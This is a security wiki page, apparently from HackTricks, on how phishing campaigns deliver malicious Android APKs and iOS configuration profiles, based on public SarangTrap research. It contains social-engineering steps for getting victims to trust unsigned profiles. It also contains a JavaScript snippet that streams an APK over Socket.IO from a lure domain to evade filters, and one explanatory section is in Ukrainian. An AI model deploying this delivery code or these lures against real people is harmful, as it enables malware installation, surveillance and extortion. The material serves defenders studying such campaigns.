# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
> The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Register dozens of look-alike domains (dating, cloud share, car service…).
– Use local language keywords and emojis in the `<title>` element to rank in Google.
– Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
* Android: direct link to an *unsigned* or “third-party store” APK.
* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection, and other post-install malware behaviour are covered in the dedicated Android Malware Post-Exploitation page below.
4. **iOS Delivery Technique**
* A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads can **pin a phishing URL to the Home Screen** with a branded icon/label.
* Web Clips can run **full‑screen** (hides the browser UI) and be marked **non‑removable**, forcing the victim to delete the profile to remove the icon.
6. **Network Layer**
* Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Android Malware Post-Exploitation

For post-install Android malware tradecraft such as C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS, and persistence, see:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості механізми контролю:
- Не розкривається статичний APK URL; payload відновлюється в пам’яті з WebSocket frames.
- URL/MIME/extension filters, що блокують прямі .apk responses, можуть не помітити binary data, передані через WebSockets/Socket.IO.
- Crawlers і URL sandboxes, які не виконують WebSockets, не отримають payload.

Дивіться також WebSocket tradecraft і tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
